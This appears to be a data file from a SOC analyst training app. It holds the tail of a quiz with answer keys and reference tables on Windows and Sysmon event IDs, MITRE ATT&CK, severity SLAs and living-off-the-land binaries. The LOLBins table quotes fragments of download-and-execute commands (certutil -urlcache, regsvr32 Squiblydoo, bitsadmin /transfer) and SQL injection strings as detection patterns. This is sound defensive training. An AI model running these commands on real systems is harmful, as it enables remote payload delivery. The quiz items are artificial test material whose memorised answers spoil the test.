    o: ["Injection (A03)", "Broken Access Control (A01)", "Security Misconfiguration (A05)", "SSRF (A10)"], a: 0, tag: "Web",
    e: "SQLi is Injection (A03). Look for ' OR 1=1, UNION SELECT, time-based SLEEP/WAITFOR patterns in web/proxy logs." },
  { q: "A WAF alert firing on a request containing \"UNION SELECT\" most likely indicates:",
    o: ["SQL injection attempt", "A normal API call", "An XSS payload", "A CSRF token"], a: 0, tag: "Web",
    e: "UNION SELECT is a classic in-band SQLi signature. Correlate with source reputation and whether the request succeeded (403 bypass is worse)." },
  { q: "Which Linux file lists all user accounts (human users usually UID >= 1000)?",
    o: ["/etc/passwd", "/etc/shadow", "/etc/sudoers", "/var/log/auth.log"], a: 0, tag: "Linux",
    e: "/etc/passwd = accounts (readable by all). /etc/shadow holds hashes (root only) — access to it is a hash-dump indicator (T1003.008)." },
  { q: "SSH brute-force / credential attacks on Linux are best spotted in which log?",
    o: ["/var/log/auth.log (Failed password / Accepted)", "nginx access.log", "/var/log/kern.log", "systemd journal only at boot"], a: 0, tag: "Linux",
    e: "auth.log records sshd 'Failed password' bursts and 'Accepted' events. A success right after many failures = compromised account (T1110)." },
  { q: "On a Linux host, persistence is most commonly found in all of the following EXCEPT:",
    o: ["Registry Run keys", "crontab / cron.d", "systemd services", "~/.bashrc and authorized_keys"], a: 0, tag: "Linux",
    e: "Registry is Windows-only. Linux persistence = cron (T1053.003), systemd units, rc.local, .bashrc, and ~/.ssh/authorized_keys backdoors." },
  { q: "In AWS, which IAM entity lets an EC2 instance obtain temporary credentials instead of embedded keys?",
    o: ["Role (STS AssumeRole)", "Access Key", "User group", "IAM Policy"], a: 0, tag: "Cloud",
    e: "Roles mint short-lived STS session tokens — the secure default. Long-term AKIA keys embedded in code are a leak risk (T1098.001)." },
  { q: "Compromised AWS access keys usually start with which prefix?",
    o: ["AKIA", "ASIA", "AIDA", "SKIA"], a: 0, tag: "Cloud",
    e: "AKIA = long-term access key ID. ASIA = temporary session token (usually fine). Seeing AKIA pasted in a repo/chat = leaked credential." },
  { q: "Which TLS artifact lets you fingerprint malware C2 even though the traffic is encrypted?",
    o: ["JA3/JA3S client fingerprint", "The HTTP User-Agent", "The destination port only", "The TLS record size is always fixed"], a: 0, tag: "Concepts",
    e: "JA3 hashes the ClientHello (cipher suites, extensions) — a stable fingerprint. Cobalt Strike & commodity RATs have known JA3 signatures." }
];

const REFERENCE = [
  {
    id: "events", title: "Windows Security Event IDs",
    sections: [
      { h: "Authentication & Logon", headers: ["ID", "Name", "Why it matters"],
        rows: [
          ["4624", "Successful Logon", "Primary logon visibility. Track who, where, how."],
          ["4625", "Failed Logon", "Brute force, password spray, credential stuffing."],
          ["4672", "Special Logon (Privileged)", "Admin logon. SeDebug, SeTcb, SeBackup privileges."],
          ["4768", "Kerberos TGT Request (AS-REQ)", "Kerberos auth start; user → KDC."],
          ["4769", "Kerberos Service Ticket (TGS-REQ)", "Service access. Kerberoasting if RC4 (0x17)."],
          ["4771", "Kerberos Pre-Auth Failed", "AS-REP roasting, Kerberos password spray."],
          ["4776", "NTLM Auth Attempt (DC)", "NTLM auth; Pass-the-Hash visibility."]
        ] },
      { h: "Process & Execution", headers: ["ID", "Name", "Why it matters"],
        rows: [
          ["4688", "Process Creation", "Process execution + command line (if GPO enabled)."],
          ["4698", "Scheduled Task Created", "Persistence. Check Author, Command, Trigger."],
          ["4699", "Scheduled Task Deleted", "Covering tracks."],
          ["4700", "Scheduled Task Enabled", "Persistence activation."]
        ] },
      { h: "Account Management", headers: ["ID", "Name", "Why it matters"],
        rows: [
          ["4720", "User Account Created", "New account creation - backdoor account."],
          ["4723", "Password Change Attempt", "Self-service vs admin reset."],
          ["4724", "Password Reset Attempt", "Admin reset - potential compromise."],
          ["4728", "User Added to Global Group", "Privilege escalation (e.g., Domain Admins)."],
          ["4732", "User Added to Domain Local Group", "Local admin / RDP access grants."]
        ] },
      { h: "Policy, Audit & Services", headers: ["ID", "Name", "Why it matters"],
        rows: [
          ["1102", "Audit Log Cleared", "Anti-forensics. Investigate immediately."],
          ["4719", "Audit Policy Changed", "Logging tampering / evasion."],
          ["4902", "Per-User Audit Policy Changed", "Targeted logging evasion."],
          ["7045", "Service Installed", "Persistence. Check path + account + name."],
          ["7036", "Service State Change", "Unusual services starting."]
        ] }
    ]
  },
  {
    id: "logon-types", title: "Logon Types (Event 4624)",
    sections: [
      { h: "The 11 logon types", headers: ["Type", "Name", "Description", "Suspicious if"],
        rows: [
          ["2", "Interactive", "Local console (keyboard)", "On a server, at 3AM, from admin"],
          ["3", "Network", "SMB, RPC, WinRM", "Service accounts, lateral movement"],
          ["4", "Batch", "Scheduled task", "Non-service account, unusual time"],
          ["5", "Service", "Service startup", "Non-service account, new service"],
          ["7", "Unlock", "Workstation unlock", "Rapid lock/unlock"],
          ["8", "NetworkCleartext", "IIS basic auth, FTP", "Credentials in cleartext"],
          ["9", "NewCredentials", "RunAs /netonly", "Lateral movement, credential theft"],
          ["10", "RemoteInteractive", "RDP", "External IP, impossible travel, admin"],
          ["11", "CachedInteractive", "Offline logon", "Laptop off-domain, cached creds"]
        ] }
    ]
  },
  {
    id: "failure-codes", title: "4625 Status / Failure Codes",
    sections: [
      { h: "Key codes", headers: ["Code", "Meaning", "Attack indicator"],
        rows: [
          ["0xC000006A", "Wrong password", "Brute force, password spray"],
          ["0xC000006D", "Bad username", "User enumeration"],
          ["0xC000006F", "Logon time restriction", "Policy violation"],
          ["0xC0000070", "Workstation restriction", "Unauthorized device"],
          ["0xC0000072", "Account disabled", "Targeting disabled accounts"],
          ["0xC000015B", "Smartcard required", "MFA bypass attempt"],
          ["0xC000019B", "Account locked out", "Brute force → lockout"],
          ["0xC0000224", "Password must change", "Forced reset"],
          ["0xC00002EE", "Account not found", "User enumeration"]
        ] }
    ]
  },
  {
    id: "sysmon", title: "Sysmon Event IDs",
    sections: [
      { h: "All 26 Event IDs", headers: ["EID", "Name", "Key use"],
        rows: [
          ["1", "Process Create", "Full cmdline, parent, hashes (crown jewel)"],
          ["2", "File Creation Time Change", "Timestomping"],
          ["3", "Network Connection", "Outbound/inbound per process"],
          ["4", "Service State Change", "Service install/start"],
          ["5", "Process Terminate", "Process exit"],
          ["6", "Driver Load", "Kernel driver load"],
          ["7", "Image Load", "DLL/EXE load (unsigned = suspicious)"],
          ["8", "CreateRemoteThread", "Cross-process injection (T1055)"],
          ["9", "RawAccessRead", "Raw disk access (NTDS.dit)"],
          ["10", "ProcessAccess", "OpenProcess w/ rights - LSASS dump"],
          ["11", "File Create", "Malware drops, staging"],
          ["12", "Registry Create/Delete", "Persistence keys"],
          ["13", "Registry Value Set", "Run keys, service config"],
          ["14", "Registry Key Rename", "Rare"],
          ["15", "File Create Stream Hash", "Alternate Data Streams"],
          ["17", "Pipe Created", "Named pipes (Cobalt Strike)"],
          ["18", "Pipe Connected", "Pipe client connections"],
          ["19", "WMI Event Filter", "Persistence (T1546.003)"],
          ["20", "WMI Event Consumer", "Persistence (T1546.003)"],
          ["21", "WMI Filter-Consumer Binding", "Persistence (T1546.003)"],
          ["22", "DNS Query", "DGA, tunneling, C2 domains"],
          ["23", "File Delete", "Covering tracks"],
          ["24", "Clipboard Change", "Clipboard theft"],
          ["25", "Process Tampering", "Process hollowing/herpaderping"],
          ["26", "File Delete Detected", "Archive via USN"]
        ] },
      { h: "LSASS access rights (EID 10)", headers: ["Hex", "Right", "Attack"],
        rows: [
          ["0x1FFFFF", "PROCESS_ALL_ACCESS", "Full control / dump"],
          ["0x001F0FFF", "VM_READ/WRITE + standard", "Memory read/write"],
          ["0x00001000", "PROCESS_VM_READ", "LSASS memory read → dump"],
          ["0x00000020", "PROCESS_VM_WRITE", "Memory write → injection"],
          ["0x00000100", "PROCESS_CREATE_THREAD", "Remote thread injection"]
        ] }
    ]
  },
  {
    id: "mitre", title: "MITRE ATT&CK — 14 Tactics",
    sections: [
      { h: "Enterprise tactics in attack order", headers: ["#", "Tactic", "ID", "Example techniques"],
        rows: [
          ["1", "Reconnaissance", "TA0043", "T1590 Active Scanning, T1598 Phishing for Info"],
          ["2", "Resource Development", "TA0042", "T1583 Acquire Infrastructure"],
          ["3", "Initial Access", "TA0001", "T1566 Phishing, T1190 Exploit Public App, T1078 Valid Accounts"],
          ["4", "Execution", "TA0002", "T1059 PowerShell, T1204 User Execution, T1053 Scheduled Task"],
          ["5", "Persistence", "TA0003", "T1547 Run Keys, T1053 Task, T1543 Service, T1546 WMI"],
          ["6", "Privilege Escalation", "TA0004", "T1068 Exploit, T1134 Token Manip, T1548 UAC Bypass"],
          ["7", "Defense Evasion", "TA0005", "T1055 Injection, T1036 Masquerade, T1562 Disable Tools"],
          ["8", "Credential Access", "TA0006", "T1003.001 LSASS, T1558 Kerberos, T1550 Alt Auth"],
          ["9", "Discovery", "TA0007", "T1082 System Info, T1018 Remote Systems, T1087 Accounts"],
          ["10", "Lateral Movement", "TA0008", "T1021 RDP/SMB/WinRM, T1550 Alt Auth, T1570 Tool Transfer"],
          ["11", "Collection", "TA0009", "T1005 Local Data, T1039 Shares, T1114 Email"],
          ["12", "Command & Control", "TA0011", "T1071 App Protocol, T1090 Proxy, T1573 Encrypted Channel"],
          ["13", "Exfiltration", "TA0010", "T1567 Web Service, T1041 C2 Channel, T1048 Alt Protocol"],
          ["14", "Impact", "TA0040", "T1486 Data Encrypted, T1485 Destruction, T1490 Recovery Inhibit"]
        ] },
      { h: "Crown-jewel techniques for L1", headers: ["Technique", "ID", "What to look for"],
        rows: [
          ["LSASS Memory Dump", "T1003.001", "Sysmon EID 10: lsass + VM_READ (0x1010)"],
          ["Kerberoasting", "T1558.003", "4769 RC4 (0x17) burst for SPNs"],
          ["Process Injection", "T1055", "Sysmon EID 8, EID 10 write, EID 25"],
          ["Registry Run Keys", "T1547.001", "Sysmon EID 12/13 Run/RunOnce"],
          ["Clear Logs", "T1070.001", "Event 1102"],
          ["DGA", "T1568.002", "High entropy, NXDOMAIN volume"]
        ] }
    ]
  },
  {
    id: "severity", title: "Severity, Priority & SLAs",
    sections: [
      { h: "Severity definitions", headers: ["Level", "Definition", "SLA (ack / contain)"],
        rows: [
          ["P1", "Active breach NOW: ransomware, exfil, DC compromise, DA compromise, worm, active C2 commands, critical vuln exploited on internet-facing asset", "15 min / 1 hr"],
          ["P2", "Compromise likely, foothold: malware+C2, brute force on privileged, impossible travel, lateral movement, persistence, credential dumping, phish+login", "30 min / 4 hrs"],
          ["P3", "Suspicious, not confirmed: encoded PowerShell, single logon anomaly, LOLBin/unsigned script, new binary, suspicious domain conn, phishing delivered (no click)", "2 hrs / 24 hrs"],
          ["P4", "Baseline deviation: policy violation, isolated failed login, blocked port scan, expired cert, TI hit on historical log", "8 hrs / batch"]
        ] },
      { h: "Priority matrix (Severity × Asset Tier)", headers: ["Asset", "P1 sev", "P2 sev", "P3 sev", "P4 sev"],
        rows: [
          ["Tier 0 (DC, PKI, PAM)", "P1", "P1", "P2", "P3"],
          ["Tier 1 (critical apps, DB, file, VPN)", "P1", "P2", "P3", "P4"],
          ["Tier 2 (standard servers/workstations)", "P2", "P3", "P4", "P4"],
          ["Tier 3 (test, dev, IoT, kiosk)", "P3", "P4", "P4", "P4"]
        ] },
      { h: "Triage time budget (Module 2)", headers: ["Alert type", "Target", "Max"],
        rows: [
          ["P1 / Critical", "5-10 min", "15 min"],
          ["P2 / High", "10-20 min", "30 min"],
          ["P3 / Medium", "20-30 min", "45 min"],
          ["P4 / Low", "Batch review", "60 min"]
        ] }
    ]
  },
  {
    id: "persistence", title: "Persistence Registry Keys",
    sections: [
      { h: "Keys to monitor (Sysmon EID 12/13)", headers: ["Key", "Technique"],
        rows: [
          ["HKLM\\SOFTWARE\\...\\CurrentVersion\\Run / RunOnce", "T1547.001 Run keys"],
          ["HKCU\\SOFTWARE\\...\\CurrentVersion\\Run / RunOnce", "T1547.001 Run keys"],
          ["HKLM\\...\\Policies\\Explorer\\Run", "T1547.001 Policy run"],
          ["HKLM\\SYSTEM\\CurrentControlSet\\Services\\*", "T1543.003 Service persistence"],
          ["HKLM\\...\\Winlogon\\Userinit / Shell", "T1547.004 Winlogon"],
          ["HKLM\\...\\Explorer\\Browser Helper Objects", "T1547.001 BHO"],
          ["HKLM\\...\\Session Manager\\KnownDLLs", "T1574 DLL hijacking"],
          ["HKLM\\SOFTWARE\\Classes\\CLSID\\...\\InprocServer32", "T1546.015 COM hijack"]
        ] },
      { h: "Suspicious process patterns", headers: ["Pattern", "Meaning"],
        rows: [
          ["Office → script (WINWORD → powershell -enc)", "Phishing / macro (T1566 → T1059.001)"],
          ["Script → script (nested PS)", "Obfuscation / staging"],
          ["SERVICES.EXE → powershell", "Service exploit"],
          ["LOLBins: rundll32, regsvr32, mshta, certutil + remote arg", "Living-off-the-land (T1218)"],
          ["High integrity child from Medium parent", "UAC bypass (T1548.002)"],
          ["Unsigned binary in Temp/AppData", "Malware drop"]
        ] }
    ]
  },
  {
    id: "correlation", title: "Attack Stage → Event Correlation",
    sections: [
      { h: "Which events to correlate per attack stage", headers: ["Attack stage", "Primary events", "Correlate with"],
        rows: [
          ["Initial Access (phishing)", "4688 Office→script, 4104 PS Script Block", "Email logs, proxy, DNS"],
          ["Credential Theft", "4672, 4624 Type 9, 4776 (NTLM)", "4688 LSASS access, 4663 NTDS.dit"],
          ["Lateral Movement", "4624 Type 3/10, 4688 PsExec/WMI, 4698 remote task", "NDR SMB/RPC, 4769"],
          ["Persistence", "4698 task, 7045 service, 4657/12/13 Run keys", "4688 execution"],
          ["Privilege Escalation", "4672, 4688 token manip", "4728/4732 group add, 4719 audit policy"],
          ["Defense Evasion", "1102 log clear, 4719 audit change", "4663 AV config, EDR tamper"],
          ["Exfiltration", "4663 file read, 5156 network connect", "NDR large transfer, proxy, cloud logs"]
        ] }
    ]
  },
  {
    id: "lolbins", title: "LOLBins — Living off the Land",
    sections: [
      { h: "Legitimate Windows binaries abused by attackers (T1218)", headers: ["Binary", "Legit use", "Abuse / TTP", "Detection"],
        rows: [
          ["powershell.exe", "Scripting, admin tasks", "PowerShell (T1059.001): -enc payloads, IEX, DownloadString C2", "EID 4104 Script Block Log, 4688 cmdline"],
          ["certutil.exe", "Certificate / checksum tool", "Download file (T1105): certutil -urlcache -f http://...", "EID 1 with -urlcache/-split/-decode"],
          ["bitsadmin.exe", "Background transfer (BITS)", "Download C2 payload via BITS (T1197): bitsadmin /transfer", "EID 1 with /transfer, EID 4817/4819"],
          ["mshta.exe", "Run HTA files", "Office → mshta with remote script (T1218.005)", "EID 1: mshta with http:// or javascript:"],
          ["rundll32.exe", "Load DLLs / DLL entry points", "Execution (T1218.011): rundll32 javascript:, mshta alias, DLL side-load", "EID 1 with javascript: / http: args"],
          ["regsvr32.exe", "Register COM/DLL", "Squiblydoo (T1218.010): regsvr32 /s /n /u /i:http:// scrobj.dll", "EID 1 with /i:http://, network conn"],
          ["wscript.exe / cscript.exe", "Run VBS/JS scripts", "Macro drop → .vbs/.js execution, obfuscated scripts", "EID 1: cscript/wscript child of Office"],
          ["msiexec.exe", "MSI installer", "Remote MSI install / persistence (T1218.007)", "EID 1: msiexec /i http:// /quiet"],
          ["cmstp.exe", "Connection Manager profile", "InfInstall (T1218.003): remote .inf install", "EID 1 with .inf over network share"],
          ["odbcconf.exe", "ODBC driver config", "Sideloading .dll / execute command (T1218.008)", "EID 1 with /a {dll} /f"],
          ["wmic.exe", "WMI command line", "Execution (T1047): wmic process call create, kill AV", "EID 1 with process call create"],
          ["forfiles.exe", "Run command on files", "Bypass execution constraints (T1202)", "EID 1: forfiles /c cmd /c"],
          ["schtasks.exe", "Create scheduled tasks", "Persistence (T1053.005): task with hidden flags /register", "EID 4698, 106"],
          ["wsl.exe", "Linux on Windows", "Run Linux tooling to bypass AV (T1202)", "EID 1 with wsl + bash -c"]
        ] },
      { h: "LOLBin parent→child red flags", headers: ["Chain", "Typical meaning"],
        rows: [
          ["OUTLOOK → powershell / wscript", "Phishing macro (T1566 → T1059.001)"],
          ["WINWORD → mshta / rundll32 / regsvr32", "Office → LOLBin download-and-exec"],
          ["rundll32 → cmd / powershell", "DLL side-loading / proxy execution"],
          ["Any LOLBin with http:// / javascript: / base64 arg", "Remote payload fetch (T1105)"],
          ["certutil / bitsadmin first run on clean machine", "Staging — pull the full command line"]
        ] }
    ]
  }
];



